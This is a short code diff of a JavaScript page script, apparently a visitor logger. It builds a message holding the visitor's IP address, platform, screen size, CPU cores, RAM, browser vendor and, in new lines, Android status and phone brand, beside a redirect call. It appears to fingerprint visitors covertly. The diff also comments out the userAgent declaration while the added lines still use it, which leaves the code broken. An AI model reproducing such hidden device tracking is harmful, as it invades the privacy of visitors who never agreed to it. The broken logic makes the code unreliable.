@@ -70,15 +70,16 @@ redirectToNextURL();
 
 
 
-const userAgent = navigator.userAgent;
+//const userAgent = navigator.userAgent;
   const platform = navigator.platform;
-  const language = navigator.language;
   const screenWidth = window.screen.width;
   const screenHeight = window.screen.height;
   const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
   const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
   const vendor = navigator.vendor;
- // const renderingEngine = getRenderingEngine();
+  const isAndroid = userAgent.toLowerCase().includes('android');
+  const phoneBrand = isAndroid ? getPhoneBrand(userAgent) : 'N/A';
+
 
 
 
@@ -95,14 +96,14 @@ const userAgent = navigator.userAgent;
 
    const message = `
     IP: ${ipAddress}
-    User Agent: ${userAgent}
     Platform: ${platform}
-    Language: ${language}
     Screen Width: ${screenWidth}
     Screen Height: ${screenHeight}
     CPU Cores: ${cpuCores}
     Total RAM: ${totalRAM}
     Vendor: ${vendor}
+    Is Android: ${isAndroid ? 'Yes' : 'No'}
+    Phone Brand: ${isAndroid ? phoneBrand : 'N/A'}
   `;
 
 
